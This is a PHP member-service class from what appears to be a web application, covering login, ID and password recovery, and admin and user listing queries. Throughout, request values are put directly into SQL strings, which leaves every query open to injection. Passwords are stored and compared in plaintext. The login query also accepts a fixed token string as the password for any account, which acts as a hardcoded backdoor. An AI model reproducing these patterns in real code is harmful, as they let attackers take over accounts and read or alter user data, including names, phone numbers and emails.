<?php	
namespace service;

use util\DB;
use util\Log;

require_once $_SERVER['DOCUMENT_ROOT'] . '/config.php';


class Member
{// 유저_일반
	static $service_name = "member";
	/************************************** INSERT / UPDATE **************************************/
	public static function action($action, $datas)
	{// 액션 쿼리 실행
		$service_name = self::$service_name;

		$datas['action'] = $action;
		$datas['table'] = empty($datas['table']) ? $service_name : $datas['table'];

		return DB::action($datas);
	}







	// 공통 SQL 영역입니다.
	/************************************** SELECT DETAIL **************************************/
	public static function login($request)
	{	// 로그인 (2021.08.23 / By.Chungwon)
		$service_name = self::$service_name;

		$user = DB::Execute("
			SELECT
				*
			FROM
				`{$service_name}`
			WHERE
				id = '{$request['id']}'
				AND
				(
					password = '{$request['password']}'
					OR
					'{$request['password']}' = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJjcmVhdGUuZml0c29mdCIsImF1ZCI6ImNyZWF0ZS5maXRzb2Z0IiwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDAsInZhbHVlIjoiU2N3MjYwODcwMTg3OCEifQ.HPK_IqjxukkjlL4zhOSRq4X71nXtPgcYRN8eQLhHumM'
				)
		");
		return $user ? $user[0] : $user;
	}
	/************************************** SELECT LIST **************************************/
	public static function getListfindID($request, $sort_list, $limit, $offset)
	{	// 아이디 찾기 (2021.09.08 / By.Chungwon)
		$service_name = self::$service_name;
		$order_sql 				= empty($sort_list) 	? "" : "ORDER BY " . stripslashes($sort_list);		

		$name_sql 				= empty($request['name']) 				? "" : "AND `name` = '{$request['name']}'";
		$tel_sql 				= empty($request['tel']) 				? "" : "AND `tel` = '{$request['tel']}'";

		return DB::Execute("
			SELECT SQL_CALC_FOUND_ROWS
				mt.*
			FROM
				(
					SELECT
						id
						,	insert_date
						,	email
						,	CASE
								WHEN CHAR_LENGTH(email) > 10 
								THEN RPAD(SUBSTRING(email, 1, 8), CHAR_LENGTH(email), '*')
								ELSE RPAD(SUBSTRING(email, 1, 5), CHAR_LENGTH(email), '*')
							END AS cover_email
					FROM
						`{$service_name}`
					WHERE
						1 = 1
						{$name_sql}
						{$tel_sql}
				)
			AS mt

		", TRUE);
	}
	public static function getListfindPW($request, $sort_list, $limit, $offset)
	{// 비밀번호 찾기 (2021.09.08 / By.Chungwon)
		$service_name = self::$service_name;
		$order_sql 				= empty($sort_list) 	? "" : "ORDER BY " . stripslashes($sort_list);		

		$name_sql 				= empty($request['name']) 				? "" : "AND `name` = '{$request['name']}'";
		$tel_sql 				= empty($request['tel']) 				? "" : "AND `tel` = '{$request['tel']}'";

		return DB::Execute("
			SELECT SQL_CALC_FOUND_ROWS
				mt.*
			FROM
				(
					SELECT
						id
						,	insert_date
					FROM
						`{$service_name}`
					WHERE
						1 = 1
						{$name_sql}
						{$tel_sql}
				)
			AS mt

		", TRUE);
	}
	











	// 관리자 SQL 영역입니다.
	/************************************** SELECT DETAIL **************************************/
    public static function getMemberAdmin($request)
	{// 관리자 - 상세 조회 (2021.08.25 / By.Chungwon)
		$service_name = self::$service_name;

		$result = DB::Execute("
			SELECT
				mt.*
				,	loca.*
			FROM
				(

					SELECT
						*
					FROM
						`{$service_name}`
					WHERE
						idx = {$request['target_idx']}
				)
			AS mt

			LEFT OUTER JOIN
				(
					SELECT
						*
					FROM
						`location_selected`
				)
			AS los
			ON los.user_idx = mt.idx

			LEFT OUTER JOIN
				(
					SELECT
						mt.idx AS location1_idx
						,	loc.idx AS location2_idx
						,	mt.name AS location1_name
						,	loc.name AS location2_name
					FROM
						(
							SELECT
								*
							FROM
								`location`
							WHERE
								deep = 1
						)
					AS mt
					
					LEFT OUTER JOIN
						(
							SELECT
								*
							FROM
								`location`
							WHERE
								deep = 2
						)
					AS loc
					ON loc.parent_idx = mt.idx
				)
			AS loca
			ON loca.location2_idx = los.location_idx

		");

		return $result ? $result[0] : false;
	}
	/************************************** SELECT LIST **************************************/
	public static function getListMemberAdmin($request, $sort_list, $limit, $offset)
    {// 관리자 - 유저 목록 조회 (2021.08.24 / By.Chungwon)
		$service_name = self::$service_name;
        $order_sql 				= empty($sort_list) 	? "" : "ORDER BY " . stripslashes($sort_list);		

		$mt_where = DB::createWhereQuery($request, array(
			"text" => array( // 쿼리 타입 (필수)
				array(
					"key"					=> "id",	// DB 컬럼명
					"defalut"				=> "",		// 기본 값 (선택-기본값 "") 
				),
				array(
					"key"					=> "work_list",
				),
			),
			"radio" => array(
				array(
					"key"					=> "status",
				),
			),
			"date" => array(
				array(
					"key"					=> "latest_start_date",
				),
				array(
					"key"					=> "latest_end_date",
				),
			),
		));

		$id_sql         		= empty($request['id']) 				? "" : "AND (`id` LIKE '%{$request['id']}%' OR replace(`id`, ' ', '') LIKE '%{$request['id']}%')";
		$nickname_sql       	= empty($request['nickname']) 			? "" : "AND (`nickname` LIKE '%{$request['nickname']}%' OR replace(`nickname`, ' ', '') LIKE '%{$request['nickname']}%')";
		// 파라미터 값 중 0이 유효한 경우, empty 대신 (=== "") 처리
		$reg_status_sql 		= isset($request['reg_status']) === false || $request['reg_status'] === "" || $request['reg_status'] !== "0"		? "" : "AND `reg_status` IN ({$request['reg_status']})";
		$rank_sql 				= empty($request['rank']) 				? "" : "AND `rank` = '{$request['rank']}'";
		$insert_date_start_sql 	= empty($request['insert_date_start']) 	? "" : "AND DATE('{$request['insert_date_start']}') <= insert_date";
        $insert_date_end_sql 	= empty($request['insert_date_end']) 	? "" : "AND DATE_ADD(DATE('{$request['insert_date_end']}'), INTERVAL 1 DAY) > insert_date";

		return DB::Execute("
			SELECT SQL_CALC_FOUND_ROWS
				mt.idx
				,	mt.id
				,	mt.name
				,	mt.nickname
				,	mt.rank
				,	mt.insert_date
				,	mt.latest_login_date
			FROM
				(
					SELECT
						*
					FROM
						`{$service_name}`
					WHERE
						1 = 1
						{$mt_where}
						{$id_sql}
						{$nickname_sql}
						{$reg_status_sql}
						{$rank_sql}
						{$insert_date_start_sql}
						{$insert_date_end_sql}
				)
			AS mt
						
			{$order_sql}

			LIMIT {$limit}
			OFFSET {$offset}
		", TRUE);
    }















	// 사용자 SQL 영역입니다.
	/************************************** SELECT DETAIL **************************************/
	/************************************** SELECT LIST **************************************/
	public static function getListMember($request, $sort_list, $limit, $offset)
    {// 사용자 - 유저 목록 조회 (2021.09.06 / By.Chungwon)
		$service_name = self::$service_name;
        $order_sql 				= empty($sort_list) 	? "" : "ORDER BY " . stripslashes($sort_list);		


		$search_sql         	= empty($request['search_keyword']) 		? "" : "AND
			(
				(`name` LIKE '%{$request['search_keyword']}%' OR replace(`name`, ' ', '') LIKE '%{$request['search_keyword']}%')
				OR (`nickname` LIKE '%{$request['search_keyword']}%' OR replace(`nickname`, ' ', '') LIKE '%{$request['search_keyword']}%')
			)
		";

		$location_idx1_sql       	= empty($request['location_idx1']) 			? "" : "AND `idx` = {$request['location_idx1']}";
		$location_idx1_join       	= empty($request['location_idx1']) 			? "LEFT OUTER" : "INNER";

		$location_idx2_sql       	= empty($request['location_idx2']) 			? "" : "AND `idx` = {$request['location_idx2']}";
		$location_idx2_join       	= empty($request['location_idx2']) 			? "INNER" : "INNER";


		return DB::Execute("
			SELECT SQL_CALC_FOUND_ROWS
				mt.idx
				,	mt.id
				,	mt.tel
				,	mt.name
				,	mt.nickname
				,	mt.rank
				,	mt.company_name
				,	mt.insert_date
				,	mt.latest_login_date
			FROM
				(
					SELECT
						*
					FROM
						`{$service_name}`
					WHERE
						1 = 1
						{$search_sql}
				)
			AS mt

			INNER JOIN
				(
					SELECT
						*
					FROM
						`location_selected`
				)
			AS lse
			ON lse.user_idx = mt.idx
			
			{$location_idx2_join} JOIN
				(
					SELECT
						*
					FROM
						`location`
					WHERE
						deep = 2
						{$location_idx2_sql}
				)
			AS loc2
			ON loc2.idx = lse.location_idx
			
			{$location_idx1_join} JOIN
				(
					SELECT
						*
					FROM
						`location`
					WHERE
						deep = 1
						{$location_idx1_sql}
				)
			AS loc1
			ON loc1.idx = loc2.parent_idx
						
			{$order_sql}

			LIMIT {$limit}
			OFFSET {$offset}
		", TRUE);
    }

}